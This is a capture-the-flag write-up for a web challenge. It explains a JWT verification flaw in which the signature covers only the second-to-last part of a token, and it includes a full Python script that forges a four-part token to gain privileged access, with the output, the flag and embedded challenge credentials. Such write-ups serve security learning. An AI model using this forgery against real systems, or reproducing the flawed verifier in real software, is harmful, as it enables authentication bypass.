# Equestria - The Dark Ruler

| Titel          | Kategorie | flag | Difficulty |
| :---        |    :----   |:--- |  :--- |
| Equestria - The Dark Ruler | Web Exploitation and Binary Exploitation  | SK-CERT{1_w1ll_rul3_th3_n1ght_4nd_th3_d4y} | medium (2 filled stars)|

## Description
There seems to be an endpoint that is only accessible by a privileged user. Can you find a way to access it?

## Attachments
The website is hosted on http://exp.cybergame.sk:7000/.
Also nginx.conf
(Follow-up challenge of [Equestria - Door To The Stable](Equestria_-_Door_To_The_Stable.md) and [Equestria - Shadow Realm](Equestria_-_Shadow_Realm.md))

## Solution
After looking at the description of the challenge I figured I need to access the `/api/secret-note` endpoint. But for that we need a valid token and also need the `req.user.is_d4rk_pr1nc3ss` variable to be set.

``` javascript
app.get("/api/secret-note", authMiddleware, async (req, res) => {
  if (req.user.is_d4rk_pr1nc3ss) {
    return res.send(process.env.DARK_PRINCESS_SECRET);
  }
  return res.send("You are not the Dark Princess");
});
```

I looked around and tried multiple ways of going about it but after looking at the implementation of the `jwt` token:

```javascript
const JWT_SECRET = v4();

function createToken(payload) {
  const base64Payload = Buffer.from(JSON.stringify(payload)).toString("base64");
  const signature = crypto
    .createHmac("sha256", JWT_SECRET)
    .update(base64Payload)
    .digest("base64");

  return `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${base64Payload}.${signature}`;
}

function verifyToken(token) {
  const parts = token.split(".");
  if (parts.length < 3) return null;

  const payload = parts[1];
  const signature = parts[parts.length - 1];

  const expectedSignature = crypto
    .createHmac("sha256", JWT_SECRET)
    .update(parts[parts.length - 2])
    .digest("base64");

  if (signature === expectedSignature) {
    return JSON.parse(Buffer.from(payload, "base64").toString());
  }
  return null;
}
```

I found that the `verifyToken` function actually is vulnerable and does not perfectly check the whole token.

Normaly the token would consist of 3 parts:

| Header | Payload | Signature |
| :--- | :--- | :--- |
| always the same | contains a json object of the users info | the signature of the payload and a secret key |

But the `verifyToken` function first checks if the token has 3 or more parts if so, it takes the `parts[1]` and stores it to be returned as the payload. Then it takes the last part of the token and stores it as the signature. After that it creates a new signature with the `parts[parts.length - 2]` which would be the payload (if its non malicious) and the secret key. The problem is now you can add new parts to the token and the method won't return early. So by adjusting the token to have 4 parts you can bypass the check and inject a custom payload into the token:

| Header | Malicious Payload | Payload | Signature |
| :--- | :--- | :--- | :--- |
| always the same | your malicious payload | contains a json object of the users info | the signature of the payload and a secret key |

So when then looking at the implementation of the `authMiddleware` function that uses the `verifyToken` function I found that the returned payload is used to set the `req.user` variable.


```javascript
function authMiddleware(req, res, next) {
    const token = req.cookies.token;
    if (!token) return res.status(401).json({ error: "No token provided" });

    const payload = verifyToken(token);
    if (!payload) {
        return res.status(401).json({ error: "Invalid token" });
    }

    req.user = payload;
    next();
}
```

So I reused some of the code of the previous challenge and built myself a script that registers a new user then logs in using the race condition to retrieve a valid token (for the signature) and then injects this token with my custom payload that contains the `is_d4rk_pr1nc3ss` variable set to `true`. After that I just had to access the `/api/secret-note` endpoint.

```python
import requests
import threading
import time
import base64
import json
from urllib.parse import unquote

url = "http://exp.cybergame.sk:7000/secretbackend"
auth_header = {"Authorization": "Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9"}

def register():
    data = {"username": "testUser", "password": "testPassword", "email": "race@winner.com"}
    return requests.post(f"{url}/api/register", json=data, headers=auth_header)

tokenData = ""

def login(session):
    data = {"username": "testUser", "password": "testPassword"}
    for _ in range(10):
        resp = session.post(f"{url}/api/login", json=data, headers=auth_header)
        if "token" in resp.cookies:
            print(f"[+] Success! Token: {resp.cookies['token']}")
            global tokenData
            tokenData = resp.cookies['token']
            return True
    return False


session = requests.Session()
register_thread = threading.Thread(target=register)
register_thread.start()
time.sleep(0.8)

if login(session):
    print("Logged in. Original Token:", tokenData)

    decoded_token = unquote(tokenData)
    print("URL-decoded Token:", decoded_token)

    try:
        parts = decoded_token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT structure")

        header, payload, signature = parts

        decoded_payload = base64.b64decode(payload + "==").decode('utf-8')
        payload_data = json.loads(decoded_payload)
        print("Original Payload:", payload_data)

        malicious_payload_data = {
            "username": payload_data.get("username"),
            "id": payload_data.get("id"),
            "is_d4rk_pr1nc3ss": "true",
        }
        print("Malicious Payload:", malicious_payload_data)
        malicious_payload = base64.b64encode(
            json.dumps(malicious_payload_data).encode('utf-8')
        ).decode('utf-8').rstrip('=')

        malicious_token = f"{header}.{malicious_payload}.{payload}.{signature}"
        print("Malicious Token:", malicious_token)

        session.cookies.clear()

        resp = session.get(
            f"{url}/api/secret-note",
            cookies={"token": malicious_token},
            headers=auth_header
        )
        print("Secret Note Response:", resp.text)

    except Exception as e:
        print("Error:", e)

else:
    print("Attack failed - try adjusting timing")
```
Printing the following output:

```
Success! Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE0OGYyODgxLTZmNzgtNGNhYi05MjczLTJiMDQ5N2IxNjk2MSIsInVzZXJuYW1lIjoidGVzdFVzZXIifQ%3D%3D.bJWHgtf%2FDHDW%2F7jD95Vg8cghJCf6a3ePXooBJ8WeHxY%3D
Logged in. Original Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE0OGYyODgxLTZmNzgtNGNhYi05MjczLTJiMDQ5N2IxNjk2MSIsInVzZXJuYW1lIjoidGVzdFVzZXIifQ%3D%3D.bJWHgtf%2FDHDW%2F7jD95Vg8cghJCf6a3ePXooBJ8WeHxY%3D
URL-decoded Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE0OGYyODgxLTZmNzgtNGNhYi05MjczLTJiMDQ5N2IxNjk2MSIsInVzZXJuYW1lIjoidGVzdFVzZXIifQ==.bJWHgtf/DHDW/7jD95Vg8cghJCf6a3ePXooBJ8WeHxY=
Original Payload: {'id': '148f2881-6f78-4cab-9273-2b0497b16961', 'username': 'testUser'}
Malicious Payload: {'username': 'testUser', 'id': '148f2881-6f78-4cab-9273-2b0497b16961', 'is_d4rk_pr1nc3ss': 'true'}
Malicious Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ0ZXN0VXNlciIsICJpZCI6ICIxNDhmMjg4MS02Zjc4LTRjYWItOTI3My0yYjA0OTdiMTY5NjEiLCAiaXNfZDRya19wcjFuYzNzcyI6ICJ0cnVlIn0.eyJpZCI6IjE0OGYyODgxLTZmNzgtNGNhYi05MjczLTJiMDQ5N2IxNjk2MSIsInVzZXJuYW1lIjoidGVzdFVzZXIifQ==.bJWHgtf/DHDW/7jD95Vg8cghJCf6a3ePXooBJ8WeHxY=
Secret Note Response: They fear the night, yet they do not understand its power. The fools bask in the daylight, blind to what lurks beyond the stars. But I see. I remember. And soon, they will too. The throne was never meant for the sun alone. The time will come. I must be patient. SK-CERT{1_w1ll_rul3_th3_n1ght_4nd_th3_d4y}
```
By looking at the Secret Note Response it contains the flag: `SK-CERT{1_w1ll_rul3_th3_n1ght_4nd_th3_d4y}`.	 